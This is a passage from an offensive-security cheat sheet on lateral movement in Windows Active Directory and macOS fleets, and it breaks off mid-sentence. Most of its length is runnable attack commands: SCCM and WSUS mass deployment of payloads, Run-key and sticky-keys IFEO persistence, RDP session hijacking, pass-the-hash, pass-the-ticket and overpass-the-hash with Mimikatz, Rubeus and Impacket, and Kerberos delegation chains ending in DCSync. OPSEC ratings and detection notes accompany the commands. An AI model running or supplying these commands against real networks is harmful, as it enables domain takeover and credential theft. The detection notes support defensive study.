# in multiple CISA advisories and SpecterOps research (Garrett Foster,
# Chris Thompson — "Misconfiguration Manager" research 2023-2024).
#
# KEY ROLES AND THEIR LATERAL VALUE:
# - Full Administrator on Site Server: complete control of all clients
# - Application Administrator: deploy arbitrary applications to clients
# - Operations Administrator: limited but useful for deploy operations
# - Software Update Manager: push fake "update" packages
# - Site Server NAA (Network Access Account): if cleartext-recoverable
#   from MEMCMP, often a domain admin or domain admin-equivalent account
#
# CLIENT-PUSH INSTALLATION PRIMITIVE:
# When SCCM site is configured for "client push" (default in many
# environments), the site server can authenticate to any computer in
# the boundary group as a privileged identity (typically the site
# server's machine account or NAA) and install the SCCM client.
# Operator-relevant detail: this provides a NTLM relay primitive when
# the site server's account has admin rights elsewhere — coerce the
# site server, relay to LDAPS or AD CS.
#
# TOOLS:
# SharpSCCM (Mayyhem) — primary offensive SCCM tool:
SharpSCCM.exe local user-secrets   # extract NAA / task sequence creds
SharpSCCM.exe local triggerinventory   # force inventory cycle
SharpSCCM.exe get devices /pretty   # enumerate managed clients
SharpSCCM.exe invoke client-push    # trigger client push install
   # Forces site server to attempt NTLM auth to attacker-controlled
   # listener — relay to ADCS / LDAPS as in standard NTLM relay chain
SharpSCCM.exe new collection /name:Pwn3d /type:device
SharpSCCM.exe new deployment /collection:Pwn3d /script:beacon.ps1
   # Mass-deploy script to all members of attacker-created collection
#
# CMLoot (chentschel) — crawl SCCM Distribution Point file shares for
# embedded credentials, certificates, scripts containing secrets.
#
# Misconfiguration Manager methodology (specterops.io):
# https://github.com/subat0mik/Misconfiguration-Manager — comprehensive
# attack/defend reference categorized by attack technique (CRED, RECON,
# ELEVATE, EXEC, TAKEOVER) with specific TTPs and remediations.
#
# DETECTION: SCCM database (SQL) audit on collection creation, deployment
#   creation, and policy modification. Site server NTLM auth from
#   unexpected sources is the primary Impacket-style relay precursor
#   indicator. ConfigMgr console activity logs (SMSAdminUI.log, etc.)
#   capture admin operations.
# OPSEC RATING: VARIABLE — SCCM-internal operations rarely trigger
#   on-endpoint EDR alerts because deployment is "expected" admin
#   activity. The audit trail is in the SCCM SQL database and console
#   logs, often less monitored than Sysmon / endpoint telemetry. But
#   mass-deployment to hundreds of endpoints simultaneously is a
#   high-fidelity behavioral anomaly for mature SOCs.

# ═══════════════════════════════════════════════════════════
# WSUS ABUSE (WSUSpect / WSUSpendu) — T1072 Software Deployment Tools
# Renewed 2024-2025 — CVE-2025-59287 boost (October 2025 WSUS RCE)
# MITRE ATT&CK: T1072 (Software Deployment Tools)
# STEALTH: HIGH (uses legitimate update channel) | DET COST: HIGH | SKILL: MED
# ═══════════════════════════════════════════════════════════
# Windows Server Update Services (WSUS) is the on-prem Microsoft
# patch-management infrastructure deployed in many AD-integrated
# enterprises. WSUS server has authority to push approved updates to
# every WSUS-managed client. Compromise of WSUS admin (or WSUS server
# itself) = domain-wide RCE primitive in a single operation.
#
# HISTORICAL: WSUSpect/WSUSpendu (Romain Coltel + Yves Le Provost,
# BlackHat 2015) — push malicious "update" to clients via SOAP API.
# Microsoft KB3148812 (2016) added SSL enforcement + signature
# validation — partially mitigated MITM-style WSUSpect, but operator-
# admin-side abuse (legitimate-creds pushing malicious update via
# legitimate WSUS console) remained viable.
#
# RENEWED 2025: CVE-2025-59287 — WSUS pre-auth deserialization RCE
# (October 2025 patch Tuesday). Public PoCs followed within days.
# Operator can hit Internet-exposed WSUS (rare but exists) OR pivot
# from internal foothold to WSUS server → SYSTEM on WSUS box.
#
# OPERATOR USE PATTERN:
# 1. Identify WSUS server (typically WSUS, SUS, UpdateServices role on
#    Server 2019/2022/2025):
nxc smb 10.0.0.0/24 -u user -p pass -M spider_plus
# Look for: \WSUS\WsusContent share; service "WsusService" running
# Or query AD for SPNs:
setspn -T target.local -Q HTTP/WSUS*
#
# 2. Confirm WSUS reachability + version:
curl -k https://wsus.target.local:8531/ApiRemoting30/WebService.asmx
# WSUS 6.x = WS2016, 10.x = WS2019/2022/2025
#
# 3. PRE-AUTH PATH (CVE-2025-59287):
#    PoCs publicly available — exploit deserialization in ApiRemoting30
#    endpoint → SYSTEM on WSUS server → full update authority
#
# 4. AUTH'D PATH (compromised WSUS admin via DPAPI / cmdkey / etc.):
#    From WSUS console (or PowerShell UpdateServices module), create
#    custom update package with malicious payload, approve for all-clients
#    target group:
Get-WsusServer | Get-WsusComputerTargetGroups
# Use SyncCertificates / signed authoritative content path — clients
# verify digital signatures on update content. Pure CAB-with-EXE WSUS
# pushes won't run unless EITHER (a) attacker has cert chain trusted by
# clients OR (b) operator abuses the install command rather than the
# binary content (e.g., legitimately-signed Microsoft installer with
# malicious /CMDLINE flags).
#
# CANONICAL APPROACH (operator-side WSUS abuse on signing-enforced
# environments): use a legitimate Microsoft-signed installer package
# (e.g., PsExec.exe Sysinternals — Microsoft-signed) that accepts
# command-line parameters → push as "update" with cmdline that runs
# operator payload. Bypasses signature check because the binary IS
# Microsoft-signed; the operator only controls the invocation.
#
# 5. Push to Computers target group → wait for next AU sync (~22h
#    default; or trigger immediate via wuauclt /detectnow). Each
#    client downloads + runs the "update" as SYSTEM.
#
# DETECTION: WSUS Reporting + IIS logs (admin actions on Update Services
#   API). Sysmon Event 1 across all clients running same unusual binary
#   from \WSUS\WsusContent — spike pattern is the highest-fidelity indicator.
#   Microsoft Defender for Endpoint "Suspicious WSUS update" detection
#   (added Q2 2025 post-CVE-2025-59287). MDI does NOT see this directly.
#   Classic forensic indicator: sudden, simultaneous identical process
#   spawn across hundreds of endpoints rooted in svchost.exe wuauclt
#   service tree.
# OPSEC RATING: VERY HIGH (single-shot domain-wide RCE) but DETECTION
#   COST: HIGH on activation due to mass-deployment spike pattern.
#   Operationally devastating; defensively obvious.

# ═══════════════════════════════════════════════════════════
# REMOTE REGISTRY EXECUTION (T1112 + T1021.002)
# ═══════════════════════════════════════════════════════════
# Write to remote host's registry to trigger execution at next user
# logon, service start, or process spawn. Less interactive than other
# methods but evades many "remote command execution" detection rules
# because the lateral payload is REGISTRY MODIFICATION, not direct
# process spawn.
#
# Requirements: admin rights on remote host; Remote Registry service
# running on target (default: started on demand on Server, manual on
# Workstation since Win10 1709).
#
# Methods:
# 1. reg.exe \\target — write Run key for next user logon:
reg.exe add "\\10.0.0.5\HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
#
# 2. PowerShell remote registry via PSDrive:
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', '10.0.0.5')
$key = $reg.OpenSubKey('Software\Microsoft\Windows\CurrentVersion\Run', $true)
$key.SetValue('Update', 'C:\Windows\Temp\beacon.exe', 'String')
#
# 3. IFEO (Image File Execution Options) — hijack a binary execution:
reg.exe add "\\10.0.0.5\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
# When sethc.exe runs (Sticky Keys at login screen), beacon.exe runs
# instead. Combined with RDP to login screen + 5x SHIFT trigger = SYSTEM
# shell pre-auth on target.
#
# 4. AppInit_DLLs — historic; mostly mitigated since RequireSignedAppInit_DLLs
#    became default. Still works if Secure Boot is off.
#
# DETECTION: Sysmon Event ID 13 (registry value set) on Run keys or IFEO
#   Debugger values. Event 4657 if SACL configured. Remote registry
#   service connections (Event 4624 type 3 from SVCHOST process for
#   RemoteRegistry).
# OPSEC RATING: MEDIUM — quieter than service/scheduled-task creation
#   but registry SACLs on persistence keys are common defender hardening.
#   IFEO Debugger writes are very high-fidelity detection for any
#   mature defender. Run key writes are often noise-tolerant in
#   environments with constant software installs.
```

---

## 3 — WINDOWS: RDP & GUI-BASED MOVEMENT

```bash
# ═══════════════════════════════════════════════════════════
# STANDARD RDP (T1021.001)
# ═══════════════════════════════════════════════════════════
xfreerdp /u:admin /p:password /v:10.0.0.5 /dynamic-resolution +clipboard
rdesktop -u admin -p password 10.0.0.5
# From Windows:
mstsc /v:10.0.0.5

# ═══════════════════════════════════════════════════════════
# RDP PASS-THE-HASH (Restricted Admin Mode — T1550.002)
# MITRE ATT&CK: T1550.002 / T1021.001
# STEALTH: LOW | SUCCESS: MED (only when RA enabled on target) | SKILL: LOW
# ═══════════════════════════════════════════════════════════
# CRITICAL REGISTRY SEMANTICS — clarified (Phase 1 C1 fix):
# The DWORD HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin
# uses INVERSE logic (it disables the disable):
#   - VALUE 0   = Restricted Admin ENABLED  ← what attacker wants
#   - VALUE 1   = Restricted Admin DISABLED
#   - MISSING   = effectively DISABLED on Win 8.1 / Server 2012 R2+
#                 (this is the OS DEFAULT — not present in fresh installs)
#
# So enabling Restricted Admin on a target requires explicitly setting
# the value to 0 (or applying the GPO equivalent). Verify with:
#   Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa' `
#     -Name DisableRestrictedAdmin -ErrorAction SilentlyContinue
#
# To enable RA on target (requires existing admin on target):
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
#
# If RA is enabled, PtH RDP works:
xfreerdp /u:admin /pth:NTLM_HASH /v:10.0.0.5 /dynamic-resolution
# Mimikatz (from Windows — also requires /restrictedadmin client flag):
sekurlsa::pth /user:admin /domain:target.local /ntlm:NTLM_HASH /run:"mstsc /restrictedadmin /v:10.0.0.5"
#
# CLIENT-SIDE FLAG REQUIREMENT:
# Restricted Admin requires BOTH:
#   1. SERVER-side: DisableRestrictedAdmin=0 in target's registry
#   2. CLIENT-side: /restrictedadmin (mstsc) or /pth (xfreerdp)
# Missing either → standard NLA password/Kerberos auth path, PtH fails.
#
# CONSEQUENCE: In Restricted Admin mode, credentials are NOT delegated
# to the remote host. The RDP session uses network-level auth with the
# hash only. This also means: from inside the RDP session, you CANNOT
# access other network resources as that user (no credential delegation)
# — you appear as the MACHINE ACCOUNT for any onward auth. Useful for
# isolation; limiting for chained lateral.
#
# DETECTION: Event ID 4624 type 10 (RemoteInteractive), RDP-specific event logs
#   TerminalServices-LocalSessionManager Event ID 21/25
#   MDI: "Suspected Pass-the-Hash" alert when RDP+NTLM observed without
#   matching prior interactive logon
# OPSEC RATING: LOW stealth — RDP sessions are highly visible regardless of
#   PtH vs password; the only PtH-specific signal is the absence of LSASS
#   credential population on the target post-session

# ═══════════════════════════════════════════════════════════
# RDP SESSION HIJACKING (T1563.002)
# ═══════════════════════════════════════════════════════════
# Hijack a disconnected (or active) RDP session — requires SYSTEM:
# Enumerate sessions:
query user
#   USERNAME      SESSIONNAME   ID  STATE
#   admin         rdp-tcp#1     2   Disconnected
# Hijack disconnected session (no password needed if SYSTEM):
tscon 2 /dest:console
# Or redirect to your session:
tscon 2 /dest:rdp-tcp#0
#
# If not SYSTEM: use PsExec/service to run tscon as SYSTEM
PsExec.exe -s -accepteula cmd /c "tscon 2 /dest:console"
#
# DETECTION: Event ID 4778 (session reconnected), tscon.exe execution
# OPSEC RATING: MEDIUM — session reconnection is logged

# ═══════════════════════════════════════════════════════════
# SHARPRDP (Programmatic RDP — no GUI needed)
# ═══════════════════════════════════════════════════════════
# Execute commands through RDP protocol without interactive GUI:
SharpRDP.exe computername=10.0.0.5 command="C:\beacon.exe" username=admin password=pass
# Useful for: headless execution, automation, avoiding mstsc.exe process

# ═══════════════════════════════════════════════════════════
# NLA (NETWORK LEVEL AUTHENTICATION) REALITY
# ═══════════════════════════════════════════════════════════
# NLA is the default on every supported Windows version since Windows 8/
# Server 2012. NLA performs CredSSP authentication BEFORE establishing the
# RDP session. Operator implications:
# - NLA does NOT prevent Pass-the-Hash on RDP — Restricted Admin Mode is
#   the relevant control. NLA is about WHEN authentication happens, not
#   WHAT credentials are accepted.
# - NLA does prevent some pre-auth RDP exploits (BlueKeep CVE-2019-0708
#   was significantly mitigated by NLA).
# - Modern xfreerdp / mstsc clients negotiate NLA automatically.
# - Some MFA-on-RDP solutions (Duo Authentication for RDP, Cisco Secure
#   Access, Yubikey for RDP) layer ON TOP of NLA — Restricted Admin /
#   PtH still bypasses the password layer but the MFA layer remains.
#   In practice: PtH + RDP against a Duo-protected target succeeds
#   through password, fails at the MFA prompt.

# ═══════════════════════════════════════════════════════════
# RDP MAN-IN-THE-MIDDLE (PyRDP)
# ═══════════════════════════════════════════════════════════
# When operator can position network-side OR control DNS/routing for
# the victim: PyRDP intercepts the RDP session, captures keystrokes,
# extracts CredSSP credentials, and optionally injects commands.
# Maintained by GoSecure since 2018 — primary RDP MITM tool.
#
# Run PyRDP MITM:
pyrdp-mitm.py 10.0.0.5      # Forwards to real target after capture
# Captures: NLA credentials, keystrokes, clipboard, file transfers,
#   screenshots of the session, and stores RDP recordings replayable
#   via pyrdp-player.
#
# Use cases:
# - ARP spoof / DNS hijack on target subnet to route victim through MITM
# - Compromised RDP gateway / Remote Desktop Web Access portal where
#   operator controls the proxy
# - Honeypot / watering-hole RDP where credentials harvested from anyone
#   who connects
#
# DETECTION: Certificate mismatch on the RDP session (PyRDP regenerates
#   certificate); RDP clients warn but users frequently click through.
#   Network: TLS handshake to unexpected intermediate host.
# OPSEC RATING: HIGH — produces no events on the original target host
#   (the connection terminates at the MITM); detection requires network-
#   side TLS inspection or end-user attention to certificate warning.

# ═══════════════════════════════════════════════════════════
# RMM TOOL ABUSE FOR LATERAL MOVEMENT (T1219)
# Scattered Spider / UNC3944 dominant pattern, also broader ransomware
# affiliate use. Documented in MGM, M&S, Co-op, and many other
# 2024-2025 incidents.
# ═══════════════════════════════════════════════════════════
# Modern enterprises commonly deploy a Remote Monitoring and Management
# (RMM) tool for legitimate IT support. Compromise of the RMM admin
# account or RMM server enables instant push-execution to every managed
# endpoint with full SYSTEM context. RMM platforms log actions in their
# own portals, not in Windows event logs — making the lateral movement
# largely invisible to standard endpoint telemetry.
#
# COMMONLY ABUSED RMM PLATFORMS:
# - ConnectWise ScreenConnect (ConnectWise Control)
# - ConnectWise Automate (LabTech)
# - Datto RMM (Autotask Endpoint Management)
# - NinjaRMM (Ninja One)
# - Atera
# - Kaseya VSA / Datto N-able
# - SolarWinds N-central / N-sight / Take Control
# - TeamViewer (Tensor / Frontline editions)
# - AnyDesk Enterprise
# - LogMeIn / GoTo Resolve
#
# OPERATOR USE PATTERN:
# 1. Identify RMM platform on victim. Common indicators:
#    - Process name: ScreenConnect.ClientService.exe, NinjaRMMAgent.exe,
#      AeroAdmin.exe, AnyDesk.exe, etc.
#    - Service name: ConnectWiseControl, NinjaRMMAgent, etc.
#    - Network connections to vendor cloud (e.g. *.screenconnect.com,
#      *.ninjarmm.com, *.atera.com)
# 2. Enumerate from Initial Access user's saved sessions / cached
#    credentials for the RMM admin portal.
# 3. Log into RMM portal as the admin user.
# 4. Push commands or deploy script to all managed endpoints. Most
#    RMMs provide bulk command execution as a standard feature.
# 5. Optionally install attacker's own backdoor RMM (a second RMM
#    not used by the target) for persistence — this is the Scattered
#    Spider extended persistence pattern.
#
# WHY THIS WORKS:
# - RMM commands run as SYSTEM by design (the agent runs as SYSTEM
#   to permit IT remote support).
# - RMM commands typically don't create Windows event logs that map
#   to "remote command execution" detection rules; they look like
#   local SYSTEM activity.
# - RMM portal access via attacker-controlled session bypasses
#   Conditional Access if the RMM is SSO-integrated and the attacker
#   already has the SSO session (e.g., from PRT theft).
#
# RECENT EXPLOITED CVES (operator-relevant — Internet-exposed RMM
# instances or unpatched on-prem RMM servers):
# - ConnectWise ScreenConnect CVE-2024-1709 + CVE-2024-1708 (Feb 2024)
#   Pre-auth admin bypass + path-traversal. Mass-exploited within hours
#   of public disclosure. CISA emergency directive.
#   Source: https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8
# - N-able N-central CVE-2024-8963 (September 2024) — pre-auth file
#   read on N-central server. Used to extract device credentials,
#   enabling RMM-as-lateral.
# - Kaseya VSA — historical baseline (REvil 2021, CVE-2021-30116)
#   periodically refreshed
# - SolarWinds Web Help Desk CVE-2024-28986 (August 2024) — Java
#   deserialization RCE; included in CISA KEV
# - Atera RMM stored-credential extraction patterns documented in
#   CrowdStrike OverWatch reports 2024-2025
#
# DETECTION: RMM portal audit logs (often the only forensic record).
#   Network: anomalous outbound to RMM cloud from hosts that don't
#   normally have the RMM agent installed (indicates secondary RMM
#   deployment for persistence). Endpoint: SYSTEM context process
#   tree starting from RMM agent that doesn't match the platform's
#   normal command patterns. Per CISA AA23-320A (Scattered Spider):
#   "review remote-access tool inventory monthly, alert on
#   unauthorized RMM installation."
# OPSEC RATING: VERY HIGH — uses legitimate management infrastructure,
#   produces little endpoint telemetry. The reliable detection is
#   identity-side (anomalous admin login to RMM portal) rather than
#   endpoint-side. Operationally the cleanest mass-lateral-movement
#   primitive available against many enterprises.

# ═══════════════════════════════════════════════════════════
# APPLE REMOTE DESKTOP (ARD) / JAMF PRO — macOS LATERAL EQUIVALENT
# MITRE ATT&CK: T1219 / T1072
# STEALTH: HIGH (legitimate management) | SUCCESS: HIGH on macOS-heavy orgs
# ═══════════════════════════════════════════════════════════
# In macOS-heavy enterprises (creative agencies, media, education,
# Apple-first dev shops), Jamf Pro and Apple Remote Desktop play the
# RMM role. Compromise = mass lateral on macOS fleet equivalent to
# Windows RMM compromise.
#
# JAMF PRO (compromised admin):
# Jamf API endpoints: /JSSResource/computers, /JSSResource/policies
curl -u admin:pass https://jamf.target.com/JSSResource/computers
# Create policy with shell-script payload, scope to "All Computers":
curl -X POST -u admin:pass https://jamf.target.com/JSSResource/policies/id/0 \
  -H "Content-Type: application/xml" -d @evil-policy.xml
# Policy executes as root via Jamf framework on next checkin (~15min)
# Documented APT use: Storm-0744 (Microsoft Threat Intel 2024-2025)
# targeting Mac-heavy enterprises via Jamf admin compromise.
#
# APPLE REMOTE DESKTOP (ARD):
# kickstart command (built-in Apple ARD agent):
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/\
Contents/Resources/kickstart -activate -configure -access -on \
  -users admin -privs -all -restart -agent
# Push-execution from ARD admin console — no separate auth challenge
# once admin session established
#
# DETECTION: Jamf Pro audit log (admin-side); ESF events on macOS clients
#   show Jamf framework binaries (jamf, jamfHelper, jamfAgent) as parent
#   for lateral payload — pattern is high-fidelity if EDR rule tuned.
# OPSEC RATING: HIGH — legitimate management infrastructure path.

```

---

## 4 — WINDOWS: CREDENTIAL MATERIAL ATTACKS

```bash
# ═══════════════════════════════════════════════════════════
# PASS-THE-HASH (T1550.002)
# ═══════════════════════════════════════════════════════════
# All Impacket tools support -hashes :NTLM_HASH:
impacket-psexec -hashes :NTLM_HASH target.local/admin@10.0.0.5
impacket-wmiexec -hashes :NTLM_HASH target.local/admin@10.0.0.5
impacket-smbexec -hashes :NTLM_HASH target.local/admin@10.0.0.5
impacket-dcomexec -hashes :NTLM_HASH target.local/admin@10.0.0.5
# netexec:
nxc smb 10.0.0.5 -u admin -H NTLM_HASH -x "whoami"
# Evil-WinRM:
evil-winrm -i 10.0.0.5 -u admin -H NTLM_HASH
# Mimikatz (from Windows — injects hash into current session):
sekurlsa::pth /user:admin /domain:target.local /ntlm:NTLM_HASH /run:cmd.exe
#
# AES-ONLY KERBEROS FOREST REALITY (critical 2026 caveat):
# In a forest enforcing AES-only Kerberos (KRBTGT and computer accounts
# configured for AES via msDS-SupportedEncryptionTypes restricted to AES,
# DCs hardened, hosts enrolled with AES keys), an inbound RC4 NTLM
# authentication from a workstation that historically authenticates via
# AES Kerberos is high-fidelity anomalous. Modern Defender for Identity
# (MDI) emits "Suspected NTLM authentication tampering" or related alerts
# in this scenario; SIEM correlation rules explicitly hunt for it.
#
# Raw Pass-the-Hash is increasingly burnt against mature targets. The
# 2026 default should be Overpass-the-Hash via AES key wherever possible
# (see below). Reserve raw NTLM PTH for:
# - Legacy environments still running older forests with mixed encryption
# - Hosts where you only have NTLM hash and no path to obtain AES key
# - Targets where MDI / mature SOC correlation is absent
#
# DETECTION: Event ID 4624 type 3 with NTLM auth package
#   If environment baseline is Kerberos-only, NTLM logons stand out
#   MDI: NTLM authentication from hosts that historically use Kerberos
# OPSEC RATING: MEDIUM-LOW on AES-enforced forests; MEDIUM on legacy

# ═══════════════════════════════════════════════════════════
# OVERPASS-THE-HASH (T1550.002) — PREFERRED FOR STEALTH
# ═══════════════════════════════════════════════════════════
# Convert NTLM hash into a real Kerberos TGT → subsequent auth uses Kerberos:
# Rubeus:
Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt
# With AES key (even stealthier — no RC4 etype downgrade):
Rubeus.exe asktgt /user:admin /aes256:AES_KEY /ptt /opsec
# Impacket:
impacket-getTGT target.local/admin -hashes :NTLM_HASH -dc-ip 10.0.0.1
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass target.local/admin@10.0.0.5
#
# WHY PREFER THIS: The TGT request generates normal Kerberos AS-REQ
#   All subsequent lateral movement uses Kerberos (no NTLM on wire)
#   Blends with normal domain authentication patterns
#
# DETECTION: Event ID 4768 (TGT requested) — only suspicious if etype is RC4
#   Use AES key (/aes256:) to avoid RC4 downgrade detection
# OPSEC RATING: HIGH stealth — generates normal-looking Kerberos AS-REQ traffic.
#   Difficult to distinguish from legitimate auth in most environments.
#   However: Microsoft's Kerberos logging guidance documents 4768/4769 visibility,
#   and SOCs with advanced analytics may flag unusual TGT request patterns
#   (e.g., RC4 etype when AES is baseline, or requests from unexpected hosts).
#   Using AES key (/aes256:) significantly reduces detection surface.

# ═══════════════════════════════════════════════════════════
# PASS-THE-TICKET (T1550.003)
# ═══════════════════════════════════════════════════════════
# Export ticket from memory:
# Mimikatz:
sekurlsa::tickets /export                      # Export all tickets as .kirbi files
kerberos::ptt ticket.kirbi                     # Import into current session
# Rubeus:
Rubeus.exe dump /nowrap                        # Dump all tickets (base64)
Rubeus.exe ptt /ticket:<base64_ticket>         # Import specific ticket
# Impacket:
export KRB5CCNAME=/tmp/admin.ccache
impacket-psexec -k -no-pass target.local/admin@10.0.0.5
#
# DETECTION: Ticket reuse from different host than original request
#   Hard to detect without correlation — requires Kerberos traffic analysis
# OPSEC RATING: HIGH stealth — uses existing valid ticket

# ═══════════════════════════════════════════════════════════
# PASS-THE-CERTIFICATE (ADCS — T1649, technically TA0006 Credential Access)
# ═══════════════════════════════════════════════════════════
# Included here because certificate theft directly enables lateral movement.
# Authenticate using stolen certificate → obtain NTLM hash + Kerberos ticket:
certipy auth -pfx admin.pfx -dc-ip 10.0.0.1
# Output: NT hash + ccache file → use either for lateral movement
# Or use Rubeus for PKINIT:
Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
#
# DETECTION: Event ID 4768 with certificate authentication indicator
#   (PKINIT TGT request). Certificate-based authentication from a host
#   or user account that doesn't normally use smart cards is anomalous
#   to mature MDI deployments — flagged as "Suspected use of forged
#   certificate" or via custom correlation rules.
#   Defender for Identity also raises "Shadow Credentials" alert if the
#   path involved KeyCredential write (Event 5136 on
#   msDS-KeyCredentialLink — see Privesc Section 7).
# OPSEC RATING: HIGH stealth — bypasses password-based monitoring, but
#   PKINIT auth from non-smartcard users is a first-class anomaly on
#   mature MDI / Sentinel deployments. Stealth depends on the user
#   actually being a smart-card user (operationally, sweet spot is
#   targeting service accounts whose credential profile already includes
#   certificate auth).

# ═══════════════════════════════════════════════════════════
# TOKEN MANIPULATION (T1134)
# ═══════════════════════════════════════════════════════════
# Mimikatz token impersonation:
token::elevate                                 # Impersonate SYSTEM
token::elevate /domainadmin                    # Impersonate any DA token in memory
token::revert                                  # Revert to original token
# Incognito (Meterpreter):
load incognito
list_tokens -u
impersonate_token "TARGET\\admin"
# With impersonated token, access remote resources as that user
#
# MODERN C2-NATIVE TOKEN PRIMITIVES (preferred over Mimikatz/Incognito
# for OPSEC — these run inline in the C2 process without spawning):
# Cobalt Strike: steal_token <PID>; rev2self; make_token DOMAIN\user pass
# Sliver:        impersonate <user>; rev2self; getsystem
# Havoc:         token-list; token-impersonate <PID>
# Outflank Stage 1: GetSystem + impersonation BOFs in C2 collection
#
# Why C2-native is quieter:
# - No Mimikatz / Incognito file artifacts on disk
# - No new process tree (C2 process already running)
# - No specific Mimikatz string signatures in memory
# - Fewer EDR API hooks fired (BOFs use direct syscalls)
#
# DETECTION: Sysmon Event 1 with parent process running as SYSTEM
#   without expected service-spawn lineage. Token impersonation events
#   are not natively logged by Windows; defenders rely on follow-on
#   action detection (e.g., SYSTEM-context process accessing user
#   resources).
# OPSEC RATING: HIGH for C2-native primitives; LOW-MEDIUM for
#   Mimikatz/Incognito (signatured by every mature EDR).

# ═══════════════════════════════════════════════════════════
# KERBEROS DELEGATION LATERAL (RBCD / Unconstrained / S4U) — NEW
# MITRE ATT&CK: T1558.003 / T1134.005 (Kerberos abuse)
# STEALTH: HIGH (legitimate Kerberos protocol) | SKILL: HIGH | SUCCESS: HIGH
# ═══════════════════════════════════════════════════════════
# Kerberos delegation primitives — RBCD, unconstrained delegation, and
# S4U2Self/S4U2Proxy chains — are core lateral movement primitives. The
# AD cheatsheet (file 08) covers the deep-dive; this section is the
# lateral-framing operator reference.
#
# --- RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) ---
# Operator pattern: write attacker-controlled computer SPN to target's
# msDS-AllowedToActOnBehalfOfOtherIdentity → S4U2Self → S4U2Proxy →
# arbitrary user impersonation on target.
#
# Prerequisites:
# - Write access to target computer object's
#   msDS-AllowedToActOnBehalfOfOtherIdentity attribute (often available
#   via GenericAll, GenericWrite, or Validated-Write to the target —
#   check via BloodHound CE)
# - Attacker-controlled computer account (default user can create up to
#   ms-DS-MachineAccountQuota = 10 by default, often left at default)
#
# Step 1: Create attacker computer account (if you don't have one):
impacket-addcomputer target.local/lowpriv:'pass' \
  -computer-name ATTACKER01 -computer-pass 'AttackerP4ss!' -dc-ip 10.0.0.1
#
# Step 2: Write RBCD attribute on target computer:
impacket-rbcd target.local/lowpriv:'pass' -dc-ip 10.0.0.1 \
  -delegate-from 'ATTACKER01$' -delegate-to 'TARGETHOST$' -action write
# Or PowerView from Windows context:
Set-DomainObject -Identity TARGETHOST$ \
  -Set @{'msds-allowedtoactonbehalfofotheridentity'=$bytes}
#
# Step 3: S4U2Self + S4U2Proxy to impersonate any user on target:
impacket-getST -spn 'cifs/TARGETHOST.target.local' \
  -impersonate Administrator target.local/ATTACKER01$:'AttackerP4ss!'
# Returns Administrator.ccache
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass target.local/Administrator@TARGETHOST.target.local
# Or Rubeus:
Rubeus.exe s4u /user:ATTACKER01$ /aes256:<key> \
  /impersonateuser:Administrator /msdsspn:cifs/TARGETHOST.target.local /ptt
#
# --- UNCONSTRAINED DELEGATION ABUSE ---
# A computer with TRUSTED_FOR_DELEGATION flag set caches FORWARDABLE
# TGTs from any user that authenticates to it. Operator pattern:
# coerce a privileged user/computer to authenticate to your unconstrained-
# delegation host → extract their TGT from LSASS → impersonate.
#
# Find unconstrained-delegation computers (excluding DCs):
impacket-findDelegation target.local/user:pass -dc-ip 10.0.0.1
# OR Powershell-AD:
Get-ADComputer -Filter {TrustedForDelegation -eq $True -and PrimaryGroupID -ne 516}
#
# After compromising one, set up monitoring:
Rubeus.exe monitor /interval:1 /nowrap
# Coerce DC to authenticate (PetitPotam/PrinterBug):
impacket-petitpotam DC01 -u attacker -p pass
# DC's machine-account TGT cached in LSASS on the compromised
# unconstrained-delegation host. Extract:
Rubeus.exe dump /service:krbtgt /nowrap
# Use DC$ TGT for DCSync:
impacket-secretsdump -k -no-pass -just-dc target.local/DC01$@10.0.0.1
#
# --- S4U2SELF + S4U2PROXY (constrained delegation) ---
# Computer with msDS-AllowedToDelegateTo populated for specific SPN(s)
# can request tickets ON BEHALF OF other users for those SPNs.
# Compromised computer with constrained delegation = arbitrary user
# impersonation against the listed services.
#
# Find constrained-delegation computers:
Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
# After compromising one:
Rubeus.exe asktgt /user:VICTIM-COMPUTER$ /aes256:<key>
Rubeus.exe s4u /ticket:<base64> /impersonateuser:Administrator \
  /msdsspn:'cifs/target.target.local' /altservice:host,http,ldap /ptt
# /altservice abuses the fact that S4U2Proxy doesn't validate the SPN
# in the issued ticket against msDS-AllowedToDelegateTo — operator can
# request CIFS but use it as HOST (full SMB), HTTP (WinRM), LDAP (DCSync)
#
# DETECTION: MDI raises:
# - "Suspected over-pass-the-hash attack (Kerberos)"
# - "Suspicious modification of a desired-state-configuration"
# - 4769 with unusual S4U service ticket pattern
# - 5136 (Directory Service object modified) on
#   msDS-AllowedToActOnBehalfOfOtherIdentity attribute
# - LDAP search for TRUSTED_FOR_DELEGATION computers from low-priv
#   account (BloodHound + Rubeus pattern)
# OPSEC RATING: HIGH — entire chain uses legitimate Kerberos protocol
#   features. Detection requires careful correlation of LDAP write +
#   subsequent S4U auth + impersonation pattern. ms-DS-MachineAccountQuota
#   should be set to 0 in hardened environments — operator-relevant
#   prereq check.

# ═══════════════════════════════════════════════════════════
# DPAPI CREDENTIAL REPLAY FOR LATERAL MOVEMENT (T1003.004 + T1555.004)
# Cross-host credential decryption using stolen DPAPI master keys
# ═══════════════════════════════════════════════════════════
# DPAPI (Data Protection API) encrypts user-context secrets — saved
# browser passwords, Outlook config, RDP saved credentials, vault
# items. Each user's master key is in turn encrypted by their domain
# password, with a domain-wide BACKUP KEY held on each domain
# controller (recoverable by Domain Admin via mimikatz).
#
# LATERAL MOVEMENT FRAMING:
# - Domain backup key once extracted = decrypt ANY user's DPAPI blob
#   on ANY domain-joined machine, FOREVER (until domain is rebuilt or
#   key is forcibly rotated — operationally irreversible without
#   significant remediation cost).
# - Per-user master keys recoverable from LSASS (live user) or via
